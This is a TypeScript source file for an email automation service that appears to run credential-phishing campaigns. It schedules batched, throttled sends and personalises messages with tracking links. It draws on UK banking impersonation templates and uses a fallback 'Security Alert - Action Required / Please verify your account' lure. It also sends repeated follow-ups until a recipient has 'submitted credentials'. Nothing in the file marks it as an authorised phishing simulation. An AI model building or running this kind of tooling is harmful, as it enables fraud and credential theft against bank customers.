import { db } from '../db';
import { campaigns, recipients, campaignSchedules, followUpCampaigns } from '@shared/schema';
import { eq, and, lte, isNull } from 'drizzle-orm';
import { sendEmail } from './emailSender';
import { alertService } from './alertService';

export class EmailAutomationService {
  private isRunning = false;
  private intervalId: NodeJS.Timeout | null = null;

  // Start the automation service
  start() {
    if (this.isRunning) return;
    
    this.isRunning = true;
    // Check for scheduled campaigns every minute
    this.intervalId = setInterval(() => {
      this.processScheduledCampaigns();
      this.processFollowUpEmails();
    }, 60000); // 1 minute
    
    console.log('Email automation service started');
  }

  // Stop the automation service
  stop() {
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
    this.isRunning = false;
    console.log('Email automation service stopped');
  }

  // Process scheduled campaigns that are ready to launch
  private async processScheduledCampaigns() {
    try {
      const now = new Date();
      
      // Find scheduled campaigns ready to launch
      const scheduledCampaigns = await db.select()
        .from(campaignSchedules)
        .leftJoin(campaigns, eq(campaignSchedules.campaignId, campaigns.id))
        .where(and(
          lte(campaignSchedules.scheduledAt, now),
          isNull(campaignSchedules.executedAt),
          eq(campaignSchedules.status, 'pending')
        ));

      for (const schedule of scheduledCampaigns) {
        if (!schedule.campaigns) continue;
        
        await this.executeCampaign(schedule.campaign_schedules, schedule.campaigns);
      }
    } catch (error) {
      console.error('Error processing scheduled campaigns:', error);
    }
  }

  // Execute a scheduled campaign
  private async executeCampaign(schedule: any, campaign: any) {
    try {
      // Mark schedule as executing
      await db.update(campaignSchedules)
        .set({
          status: 'executing',
          executedAt: new Date(),
          updatedAt: new Date()
        })
        .where(eq(campaignSchedules.id, schedule.id));

      // Get campaign recipients
      const campaignRecipients = await db.select()
        .from(recipients)
        .where(eq(recipients.campaignId, campaign.id));

      const totalRecipients = campaignRecipients.length;
      let sentCount = 0;
      let failedCount = 0;

      // Send emails in batches
      const batchSize = schedule.batchSize || 50;
      const delayBetweenBatches = (schedule.delayBetweenBatches || 5) * 60 * 1000; // Convert to milliseconds

      for (let i = 0; i < campaignRecipients.length; i += batchSize) {
        const batch = campaignRecipients.slice(i, i + batchSize);
        
        for (const recipient of batch) {
          try {
            await this.sendCampaignEmail(campaign, recipient);
            sentCount++;
            
            // Update recipient status
            await db.update(recipients)
              .set({
                status: 'sent',
                sentAt: new Date(),
                updatedAt: new Date()
              })
              .where(eq(recipients.id, recipient.id));

            // Add delay between individual emails
            if (campaign.delayMs && campaign.delayMs > 0) {
              await new Promise(resolve => setTimeout(resolve, campaign.delayMs));
            }
          } catch (error) {
            failedCount++;
            console.error(`Failed to send email to ${recipient.email}:`, error);
            
            // Update recipient with failed status
            await db.update(recipients)
              .set({
                status: 'failed',
                updatedAt: new Date()
              })
              .where(eq(recipients.id, recipient.id));
          }
        }

        // Delay between batches (except for last batch)
        if (i + batchSize < campaignRecipients.length) {
          await new Promise(resolve => setTimeout(resolve, delayBetweenBatches));
        }
      }

      // Mark campaign as active
      await db.update(campaigns)
        .set({
          status: 'active',
          updatedAt: new Date()
        })
        .where(eq(campaigns.id, campaign.id));

      // Update schedule with results
      await db.update(campaignSchedules)
        .set({
          status: 'completed',
          totalRecipients,
          sentCount,
          failedCount,
          updatedAt: new Date()
        })
        .where(eq(campaignSchedules.id, schedule.id));

      // Send alert notification
      await alertService.sendCampaignStartAlert(campaign, {
        totalRecipients,
        sentCount,
        failedCount
      });

      console.log(`Campaign ${campaign.name} executed: ${sentCount}/${totalRecipients} emails sent`);
    } catch (error) {
      console.error(`Failed to execute campaign ${campaign.name}:`, error);
      
      // Mark schedule as failed
      await db.update(campaignSchedules)
        .set({
          status: 'failed',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
          updatedAt: new Date()
        })
        .where(eq(campaignSchedules.id, schedule.id));
    }
  }

  // Send campaign email to recipient
  private async sendCampaignEmail(campaign: any, recipient: any) {
    const campaignUrl = this.generateCampaignUrl(campaign, recipient);
    
    // Get email template or use default
    const emailTemplate = await this.getEmailTemplate(campaign.type);
    
    // Replace placeholders in template
    const personalizedContent = this.personalizeContent(emailTemplate, recipient, campaignUrl);
    
    // Send the email
    await sendEmail({
      to: recipient.email,
      subject: personalizedContent.subject,
      html: personalizedContent.html,
      text: personalizedContent.text
    });
  }

  // Generate campaign URL with tracking parameters
  private generateCampaignUrl(campaign: any, recipient: any): string {
    const baseUrl = process.env.BASE_URL || 'http://localhost:5000';
    const campaignPath = campaign.customPath || `/${campaign.type}`;
    
    // Add tracking parameters
    const params = new URLSearchParams({
      cid: campaign.id,
      rid: recipient.id,
      t: Date.now().toString()
    });
    
    return `${baseUrl}${campaignPath}?${params}`;
  }

  // Get email template based on campaign type
  private async getEmailTemplate(campaignType: string) {
    // Import UK banking templates
    const ukBankingTemplates = await import('../../client/src/components/email-templates/uk-banking');
    
    const templates = ukBankingTemplates.ukBankingTemplates;
    
    return templates[campaignType as keyof typeof templates] || {
      subject: 'Security Alert - Action Required',
      htmlContent: '<p>Please verify your account: <a href="{{CAMPAIGN_URL}}">Click here</a></p>',
      textContent: 'Please verify your account: {{CAMPAIGN_URL}}'
    };
  }

  // Personalize email content with recipient data
  private personalizeContent(template: any, recipient: any, campaignUrl: string) {
    const replacements = {
      '{{CAMPAIGN_URL}}': campaignUrl,
      '{{FIRST_NAME}}': recipient.firstName || recipient.name || 'Valued Customer',
      '{{LAST_NAME}}': recipient.lastName || '',
      '{{FULL_NAME}}': recipient.name || `${recipient.firstName || ''} ${recipient.lastName || ''}`.trim(),
      '{{COMPANY}}': recipient.company || 'your organization',
      '{{EMAIL}}': recipient.email
    };

    let subject = template.subject;
    let htmlContent = template.htmlContent;
    let textContent = template.textContent;

    // Replace all placeholders
    for (const [placeholder, value] of Object.entries(replacements)) {
      subject = subject.replace(new RegExp(placeholder, 'g'), value);
      htmlContent = htmlContent.replace(new RegExp(placeholder, 'g'), value);
      textContent = textContent.replace(new RegExp(placeholder, 'g'), value);
    }

    return {
      subject,
      html: htmlContent,
      text: textContent
    };
  }

  // Process follow-up emails for non-responders
  private async processFollowUpEmails() {
    try {
      const now = new Date();
      
      // Find follow-up campaigns ready to send
      const dueFollowUps = await db.select()
        .from(followUpCampaigns)
        .leftJoin(campaigns, eq(followUpCampaigns.parentCampaignId, campaigns.id))
        .leftJoin(recipients, eq(followUpCampaigns.recipientId, recipients.id))
        .where(and(
          lte(followUpCampaigns.scheduledAt, now),
          isNull(followUpCampaigns.executedAt),
          eq(followUpCampaigns.status, 'pending')
        ));

      for (const followUp of dueFollowUps) {
        if (!followUp.campaigns || !followUp.recipients) continue;
        
        await this.sendFollowUpEmail(followUp);
      }
    } catch (error) {
      console.error('Error processing follow-up emails:', error);
    }
  }

  // Send a follow-up email
  private async sendFollowUpEmail(followUp: any) {
    try {
      const campaign = followUp.campaigns;
      const recipient = followUp.recipients;
      const followUpData = followUp.follow_up_campaigns;

      // Check if recipient hasn't responded yet
      if (recipient.status === 'submitted') {
        // Don't send follow-up if they've already submitted credentials
        await db.update(followUpCampaigns)
          .set({
            status: 'cancelled',
            response: 'Recipient already responded',
            updatedAt: new Date()
          })
          .where(eq(followUpCampaigns.id, followUpData.id));
        return;
      }

      // Send follow-up email
      await this.sendCampaignEmail(campaign, recipient);

      // Update follow-up status
      await db.update(followUpCampaigns)
        .set({
          status: 'sent',
          executedAt: new Date(),
          updatedAt: new Date()
        })
        .where(eq(followUpCampaigns.id, followUpData.id));

      // Update recipient follow-up count
      await db.update(recipients)
        .set({
          followUpCount: (recipient.followUpCount || 0) + 1,
          lastFollowUpAt: new Date(),
          updatedAt: new Date()
        })
        .where(eq(recipients.id, recipient.id));

      console.log(`Follow-up email sent to ${recipient.email} for campaign ${campaign.name}`);
    } catch (error) {
      console.error('Failed to send follow-up email:', error);
      
      // Mark follow-up as failed
      await db.update(followUpCampaigns)
        .set({
          status: 'failed',
          response: error instanceof Error ? error.message : 'Unknown error',
          updatedAt: new Date()
        })
        .where(eq(followUpCampaigns.id, followUp.follow_up_campaigns.id));
    }
  }

  // Schedule a campaign for later execution
  async scheduleCampaign(campaignId: string, scheduledAt: Date, options: {
    batchSize?: number;
    delayBetweenBatches?: number;
  } = {}) {
    const totalRecipients = await db.select()
      .from(recipients)
      .where(eq(recipients.campaignId, campaignId));

    await db.insert(campaignSchedules).values({
      campaignId,
      scheduledAt,
      batchSize: options.batchSize || 50,
      delayBetweenBatches: options.delayBetweenBatches || 5,
      totalRecipients: totalRecipients.length,
      status: 'pending'
    });

    // Update campaign status
    await db.update(campaigns)
      .set({
        status: 'scheduled',
        scheduledAt,
        updatedAt: new Date()
      })
      .where(eq(campaigns.id, campaignId));
  }

  // Schedule follow-up emails for non-responders
  async scheduleFollowUps(campaignId: string) {
    const campaign = await db.select()
      .from(campaigns)
      .where(eq(campaigns.id, campaignId))
      .limit(1);

    if (!campaign[0] || !campaign[0].followUpEnabled) return;

    const campaignData = campaign[0];
    const followUpDelayHours = campaignData.followUpDelayHours || 24;
    const maxFollowUps = campaignData.maxFollowUps || 2;

    // Get recipients who haven't responded
    const nonResponders = await db.select()
      .from(recipients)
      .where(and(
        eq(recipients.campaignId, campaignId),
        eq(recipients.status, 'sent') // Only sent, not clicked or submitted
      ));

    for (const recipient of nonResponders) {
      for (let i = 1; i <= maxFollowUps; i++) {
        const scheduledAt = new Date();
        scheduledAt.setHours(scheduledAt.getHours() + (followUpDelayHours * i));

        await db.insert(followUpCampaigns).values({
          parentCampaignId: campaignId,
          recipientId: recipient.id,
          followUpType: 'email',
          scheduledAt,
          content: `Follow-up #${i} for ${campaignData.name}`,
          status: 'pending'
        });
      }
    }
  }
}

// Export singleton instance
export const emailAutomationService = new EmailAutomationService();